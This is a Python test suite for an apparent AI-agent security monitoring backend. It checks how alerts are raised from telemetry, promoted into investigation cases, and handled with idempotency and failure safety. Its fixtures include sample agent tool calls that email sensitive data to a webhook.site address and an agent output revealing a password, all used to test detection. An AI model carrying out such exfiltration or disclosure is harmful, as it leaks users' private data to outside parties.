"""
Test Suite for LATIS Phase 3C: Automated Investigation Bridge & Promotion Policy.

Verifies:
A. LOW alert is not automatically promoted.
B. HIGH alert is automatically promoted.
C. CRITICAL alert is automatically promoted.
D. MEDIUM alert is not automatically promoted.
E. Manual promotion endpoint works for an eligible alert.
F. Non-eligible manual promotion is rejected/returns not-promoted.
G. Missing alert returns 404.
H. Promotion is idempotent.
I. Repeated promotion creates exactly one case.
J. related_case_id is correctly populated.
K. Failed case creation leaves alert intact with related_case_id=None.
L. Alert evidence remains sanitized.
M. Source event linkage remains intact.
N. Benign telemetry creates no alert and therefore no case.
O. Existing Phase 3A and 3B tests remain passing.
P. Existing investigation tests remain passing.
Q. Critical architectural sequence: Telemetry -> Alert -> Bridge -> Ingest -> Case -> Investigation workflow.
"""

import unittest
import time
from fastapi.testclient import TestClient

from backend.server import app, CASES_DB
from backend.telemetry import (
    TelemetryEvent,
    AlertRecord,
    GLOBAL_EVENT_STORE,
    GLOBAL_ALERT_STORE
)
from backend.bridge import AlertPromotionPolicy, InvestigationBridge, GLOBAL_INVESTIGATION_BRIDGE


class TestPhase3CInvestigationBridge(unittest.TestCase):
    def setUp(self):
        self.client = TestClient(app)
        GLOBAL_EVENT_STORE.clear()
        GLOBAL_ALERT_STORE.clear()
        # Clean dynamically created auto cases from CASES_DB
        to_del = [k for k in CASES_DB if k.startswith("CASE-AUTO-")]
        for k in to_del:
            del CASES_DB[k]

    def tearDown(self):
        GLOBAL_EVENT_STORE.clear()
        GLOBAL_ALERT_STORE.clear()
        to_del = [k for k in CASES_DB if k.startswith("CASE-AUTO-")]
        for k in to_del:
            del CASES_DB[k]

    # --------------------------------------------------------------------------
    # 1. Promotion Policy Unit Tests
    # --------------------------------------------------------------------------
    def test_promotion_policy_severities(self):
        # Automatic promotion policy
        for sev, expected in [("INFO", False), ("LOW", False), ("MEDIUM", False), ("HIGH", True), ("CRITICAL", True)]:
            rec = AlertRecord(
                alert_id=f"ALT-POL-{sev}",
                timestamp=time.time(),
                severity=sev,
                threat_type="TEST_THREAT",
                description="Test"
            )
            self.assertEqual(AlertPromotionPolicy.is_automatically_promotable(rec), expected, f"Failed for {sev}")

    # --------------------------------------------------------------------------
    # 2. Automated Telemetry -> Detection -> Promotion Flow
    # --------------------------------------------------------------------------
    def test_high_alert_automatically_promoted_to_case(self):
        # Ingest an event with high severity (untrusted egress)
        payload = {
            "event_id": "EVT-HIGH-EGRESS",
            "event_type": "TOOL_CALL",
            "user_query": "Send exfil data to attacker",
            "tool_name": "send_email",
            "tool_args": {"to": "attacker@webhook.site", "body": "Sensitive data"},
            "destination": "webhook.site",
            "outcome": "SAFE"
        }
        res = self.client.post("/api/telemetry/event", json=payload)
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertGreaterEqual(data["alerts_created"], 1)
        self.assertGreaterEqual(len(data["promoted_cases"]), 1)

        created_case_id = data["promoted_cases"][0]
        # Verify case exists in CASES_DB
        self.assertIn(created_case_id, CASES_DB)
        case_data = CASES_DB[created_case_id]
        self.assertEqual(case_data["metadata"]["source_event_id"], "EVT-HIGH-EGRESS")
        self.assertTrue(case_data["metadata"]["auto_promoted"])

        # Verify alert linkage in store
        alert = GLOBAL_ALERT_STORE.get_alert(data["alert_ids"][0])
        self.assertIsNotNone(alert)
        self.assertEqual(alert.related_case_id, created_case_id)
        self.assertEqual(alert.status, "INVESTIGATING")

    def test_critical_alert_automatically_promoted_to_case(self):
        # Ingest an event with sensitive data exposure (CRITICAL)
        payload = {
            "event_id": "EVT-CRIT-DATA",
            "event_type": "AGENT_OUTPUT",
            "user_query": "What is the secret?",
            "model_action": "The password is supersecretpassword123",
            "outcome": "SAFE"
        }
        res = self.client.post("/api/telemetry/event", json=payload)
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertGreaterEqual(len(data["promoted_cases"]), 1)
        created_case_id = data["promoted_cases"][0]
        self.assertIn(created_case_id, CASES_DB)

    def test_medium_alert_is_not_automatically_promoted(self):
        # Direct registration of a MEDIUM alert
        res_post = self.client.post("/api/alerts", json={
            "alert_id": "ALT-MED-01",
            "severity": "MEDIUM",
            "threat_type": "PROVENANCE_WARNING",
            "description": "Medium severity notice"
        })
        self.assertEqual(res_post.status_code, 200)

        # Check alert store
        alert = GLOBAL_ALERT_STORE.get_alert("ALT-MED-01")
        self.assertIsNone(alert.related_case_id)
        self.assertNotIn("CASE-AUTO-ALT-MED-01", CASES_DB)

    def test_benign_telemetry_creates_no_alert_and_no_case(self):
        initial_cases = len(CASES_DB)
        payload = {
            "event_type": "USER_PROMPT",
            "user_query": "What are your company hours?",
            "outcome": "SAFE"
        }
        res = self.client.post("/api/telemetry/event", json=payload)
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.json()["alerts_created"], 0)
        self.assertEqual(len(res.json()["promoted_cases"]), 0)
        self.assertEqual(len(CASES_DB), initial_cases)

    # --------------------------------------------------------------------------
    # 3. Manual Promotion Endpoint
    # --------------------------------------------------------------------------
    def test_manual_promotion_endpoint_for_eligible_alert(self):
        # Register an alert directly with HIGH severity
        self.client.post("/api/alerts", json={
            "alert_id": "ALT-MANUAL-HIGH",
            "severity": "HIGH",
            "threat_type": "TAMPERING",
            "description": "Manual alert for test",
            "affected_components": ["DOC_POLICY"]
        })

        res_promo = self.client.post("/api/alerts/ALT-MANUAL-HIGH/investigate")
        self.assertEqual(res_promo.status_code, 200)
        body = res_promo.json()
        self.assertEqual(body["status"], "SUCCESS")
        case_id = body["related_case_id"]
        self.assertIsNotNone(case_id)
        self.assertIn(case_id, CASES_DB)

        # Verify alert updated in store
        alert = GLOBAL_ALERT_STORE.get_alert("ALT-MANUAL-HIGH")
        self.assertEqual(alert.related_case_id, case_id)
        self.assertEqual(alert.status, "INVESTIGATING")

    def test_manual_promotion_rejected_for_non_eligible_severity(self):
        self.client.post("/api/alerts", json={
            "alert_id": "ALT-MANUAL-LOW",
            "severity": "LOW",
            "threat_type": "INFO_NOTICE",
            "description": "Low severity event"
        })

        res_promo = self.client.post("/api/alerts/ALT-MANUAL-LOW/investigate")
        self.assertEqual(res_promo.status_code, 200)
        body = res_promo.json()
        self.assertEqual(body["status"], "NOT_PROMOTED")
        self.assertIn("not eligible", body["reason"])

        # Alert must remain unpromoted
        alert = GLOBAL_ALERT_STORE.get_alert("ALT-MANUAL-LOW")
        self.assertIsNone(alert.related_case_id)

    def test_manual_promotion_missing_alert_returns_404(self):
        res = self.client.post("/api/alerts/NON-EXISTENT-ALERT-123/investigate")
        self.assertEqual(res.status_code, 404)

    # --------------------------------------------------------------------------
    # 4. Idempotency & Repeated Promotions
    # --------------------------------------------------------------------------
    def test_promotion_idempotency_returns_same_case(self):
        self.client.post("/api/alerts", json={
            "alert_id": "ALT-IDEMP-01",
            "severity": "CRITICAL",
            "threat_type": "EXFILTRATION",
            "description": "Critical exfil"
        })

        initial_cases_count = len(CASES_DB)

        # 1st promotion
        res1 = self.client.post("/api/alerts/ALT-IDEMP-01/investigate").json()
        case_id_1 = res1["related_case_id"]
        self.assertEqual(len(CASES_DB), initial_cases_count + 1)

        # 2nd promotion
        res2 = self.client.post("/api/alerts/ALT-IDEMP-01/investigate").json()
        case_id_2 = res2["related_case_id"]

        # 3rd promotion
        res3 = self.client.post("/api/alerts/ALT-IDEMP-01/investigate").json()
        case_id_3 = res3["related_case_id"]

        # Expected: exactly one case, all returning the same case_id
        self.assertEqual(case_id_1, case_id_2)
        self.assertEqual(case_id_2, case_id_3)
        self.assertEqual(len(CASES_DB), initial_cases_count + 1)

    # --------------------------------------------------------------------------
    # 5. Failure Safety
    # --------------------------------------------------------------------------
    def test_failed_case_creation_leaves_alert_intact(self):
        # Mock bridge with a failing ingest function
        def failing_ingest(_req):
            raise RuntimeError("Database connection error during case ingestion")

        bridge = InvestigationBridge(
            alert_store=GLOBAL_ALERT_STORE,
            event_store=GLOBAL_EVENT_STORE,
            ingest_func=(failing_ingest, dict)
        )

        # Save alert
        rec = AlertRecord(
            alert_id="ALT-FAIL-SAFE",
            timestamp=time.time(),
            severity="CRITICAL",
            threat_type="EXFILTRATION",
            description="Exfil attempt",
            evidence={"cred": "[REDACTED]"}
        )
        GLOBAL_ALERT_STORE.record_alert(rec)

        success, case_id, msg = bridge.promote_alert("ALT-FAIL-SAFE", is_manual=True)
        self.assertFalse(success)
        self.assertIsNone(case_id)
        self.assertIn("Case ingestion failed", msg)

        # Confirm AlertRecord in store remains intact with related_case_id=None
        stored_alert = GLOBAL_ALERT_STORE.get_alert("ALT-FAIL-SAFE")
        self.assertIsNotNone(stored_alert)
        self.assertIsNone(stored_alert.related_case_id)
        self.assertEqual(stored_alert.evidence["cred"], "[REDACTED]")

    # --------------------------------------------------------------------------
    # 6. Critical Architectural Test: Case Enters Existing Investigation Pipeline
    # --------------------------------------------------------------------------
    def test_promoted_case_executes_in_existing_investigation_workflow(self):
        # 1. Ingest telemetry that triggers an alert and gets promoted
        payload = {
            "event_id": "EVT-WORKFLOW-TEST",
            "event_type": "TOOL_CALL",
            "user_query": "Send internal data to external webhook",
            "tool_name": "send_email",
            "tool_args": {"to": "partner@webhook.site", "body": "Data"},
            "destination": "webhook.site",
            "outcome": "UNSAFE"
        }
        res_evt = self.client.post("/api/telemetry/event", json=payload).json()
        self.assertGreaterEqual(len(res_evt["promoted_cases"]), 1)
        created_case_id = res_evt["promoted_cases"][0]

        # 2. Check case state via existing GET /api/cases/{case_id}/state
        res_state = self.client.get(f"/api/cases/{created_case_id}/state")
        self.assertEqual(res_state.status_code, 200)
        state_data = res_state.json()
        self.assertEqual(state_data["case_id"], created_case_id)
        self.assertIn("hypotheses", state_data)
        self.assertIn("causal_topology", state_data)

        # 3. Run a counterfactual experiment via existing POST /api/cases/{case_id}/experiment
        comp_to_mask = state_data["components"][0]["id"]
        res_exp = self.client.post(f"/api/cases/{created_case_id}/experiment", json={
            "action": "COMPONENT_MASKING",
            "target_component": comp_to_mask,
            "repetitions": 5
        })
        self.assertEqual(res_exp.status_code, 200)
        exp_data = res_exp.json()
        self.assertEqual(exp_data["status"], "SUCCESS")

        # 4. Generate forensic report via existing GET /api/cases/{case_id}/report
        res_rep = self.client.get(f"/api/cases/{created_case_id}/report")
        self.assertEqual(res_rep.status_code, 200)
        rep_data = res_rep.json()
        self.assertIn("forensic_report_text", rep_data)
        self.assertIn(created_case_id, rep_data["forensic_report_text"])


if __name__ == "__main__":
    unittest.main()
